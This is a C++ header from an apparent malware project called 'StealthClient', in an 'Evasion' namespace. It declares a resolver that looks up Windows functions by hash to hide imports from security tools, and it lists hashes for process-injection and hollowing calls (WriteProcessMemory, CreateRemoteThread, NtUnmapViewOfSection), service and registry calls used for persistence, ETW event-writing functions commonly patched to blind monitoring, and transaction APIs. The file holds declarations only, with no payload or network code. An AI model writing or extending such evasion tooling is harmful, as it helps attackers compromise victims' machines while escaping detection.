#pragma once
#include <windows.h>
#include <string>
#include <unordered_map>
#include <functional>

namespace StealthClient {
namespace Evasion {

// Custom hash function for API names
constexpr uint32_t HashString(const char* str) {
    uint32_t hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// Macro for compile-time string hashing
#define HASH_API(name) (HashString(name))

class DynamicAPIResolver {
private:
    std::unordered_map<uint32_t, HMODULE> m_moduleCache;
    std::unordered_map<uint32_t, FARPROC> m_functionCache;
    
    HMODULE LoadModuleByHash(uint32_t moduleHash);
    FARPROC GetFunctionByHash(HMODULE module, uint32_t functionHash);
    
public:
    DynamicAPIResolver();
    ~DynamicAPIResolver();
    
    // Template function for getting typed function pointers
    template<typename T>
    T GetFunction(uint32_t moduleHash, uint32_t functionHash) {
        HMODULE module = LoadModuleByHash(moduleHash);
        if (!module) return nullptr;
        
        FARPROC func = GetFunctionByHash(module, functionHash);
        return reinterpret_cast<T>(func);
    }
    
    // Convenience methods for common APIs
    FARPROC GetKernel32Function(uint32_t functionHash);
    FARPROC GetNtdllFunction(uint32_t functionHash);
    FARPROC GetUser32Function(uint32_t functionHash);
    FARPROC GetAdvapi32Function(uint32_t functionHash);
    
    // Clear caches
    void ClearCache();
};

// Global instance
extern DynamicAPIResolver g_APIResolver;

// Convenience macros
#define GET_KERNEL32_FUNC(hash) g_APIResolver.GetKernel32Function(hash)
#define GET_NTDLL_FUNC(hash) g_APIResolver.GetNtdllFunction(hash)
#define GET_USER32_FUNC(hash) g_APIResolver.GetUser32Function(hash)
#define GET_ADVAPI32_FUNC(hash) g_APIResolver.GetAdvapi32Function(hash)

// Common API hashes
namespace APIHashes {
    constexpr uint32_t KERNEL32 = HASH_API("kernel32.dll");
    constexpr uint32_t NTDLL = HASH_API("ntdll.dll");
    constexpr uint32_t USER32 = HASH_API("user32.dll");
    constexpr uint32_t ADVAPI32 = HASH_API("advapi32.dll");
    
    // Kernel32 functions
    constexpr uint32_t VIRTUAL_ALLOC = HASH_API("VirtualAlloc");
    constexpr uint32_t VIRTUAL_FREE = HASH_API("VirtualFree");
    constexpr uint32_t VIRTUAL_PROTECT = HASH_API("VirtualProtect");
    constexpr uint32_t CREATE_PROCESS = HASH_API("CreateProcessA");
    constexpr uint32_t OPEN_PROCESS = HASH_API("OpenProcess");
    constexpr uint32_t WRITE_PROCESS_MEMORY = HASH_API("WriteProcessMemory");
    constexpr uint32_t READ_PROCESS_MEMORY = HASH_API("ReadProcessMemory");
    constexpr uint32_t CREATE_REMOTE_THREAD = HASH_API("CreateRemoteThread");
    constexpr uint32_t LOAD_LIBRARY = HASH_API("LoadLibraryA");
    constexpr uint32_t GET_PROC_ADDRESS = HASH_API("GetProcAddress");
    
    // Ntdll functions
    constexpr uint32_t NT_ALLOCATE_VIRTUAL_MEMORY = HASH_API("NtAllocateVirtualMemory");
    constexpr uint32_t NT_FREE_VIRTUAL_MEMORY = HASH_API("NtFreeVirtualMemory");
    constexpr uint32_t NT_PROTECT_VIRTUAL_MEMORY = HASH_API("NtProtectVirtualMemory");
    constexpr uint32_t NT_WRITE_VIRTUAL_MEMORY = HASH_API("NtWriteVirtualMemory");
    constexpr uint32_t NT_READ_VIRTUAL_MEMORY = HASH_API("NtReadVirtualMemory");
    constexpr uint32_t NT_CREATE_THREAD_EX = HASH_API("NtCreateThreadEx");
    constexpr uint32_t NT_UNMAP_VIEW_OF_SECTION = HASH_API("NtUnmapViewOfSection");
    constexpr uint32_t NT_QUERY_INFORMATION_PROCESS = HASH_API("NtQueryInformationProcess");
    constexpr uint32_t NT_SET_INFORMATION_PROCESS = HASH_API("NtSetInformationProcess");
    
    // User32 functions
    constexpr uint32_t MESSAGE_BOX = HASH_API("MessageBoxA");
    constexpr uint32_t FIND_WINDOW = HASH_API("FindWindowA");
    constexpr uint32_t GET_WINDOW_THREAD_PROCESS_ID = HASH_API("GetWindowThreadProcessId");
    
    // Advapi32 functions
    constexpr uint32_t OPEN_SC_MANAGER = HASH_API("OpenSCManagerA");
    constexpr uint32_t CREATE_SERVICE = HASH_API("CreateServiceA");
    constexpr uint32_t START_SERVICE = HASH_API("StartServiceA");
    constexpr uint32_t REG_OPEN_KEY = HASH_API("RegOpenKeyExA");
    constexpr uint32_t REG_SET_VALUE = HASH_API("RegSetValueExA");
    constexpr uint32_t REG_QUERY_VALUE = HASH_API("RegQueryValueExA");
    constexpr uint32_t ETW_EVENT_WRITE = HASH_API("EtwEventWrite");
    constexpr uint32_t ETW_EVENT_WRITE_EX = HASH_API("EtwEventWriteEx");
    constexpr uint32_t ETW_EVENT_WRITE_STRING = HASH_API("EtwEventWriteString");
    constexpr uint32_t ETW_EVENT_WRITE_TRANSFER = HASH_API("EtwEventWriteTransfer");
    
    // Additional Ntdll functions
    constexpr uint32_t NT_TRACE_EVENT = HASH_API("NtTraceEvent");
    constexpr uint32_t NT_TRACE_CONTROL = HASH_API("NtTraceControl");
    
    // Transaction functions
    constexpr uint32_t CREATE_TRANSACTION = HASH_API("CreateTransaction");
    constexpr uint32_t COMMIT_TRANSACTION = HASH_API("CommitTransaction");
    constexpr uint32_t ROLLBACK_TRANSACTION = HASH_API("RollbackTransaction");
}

} // namespace Evasion
} // namespace StealthClient
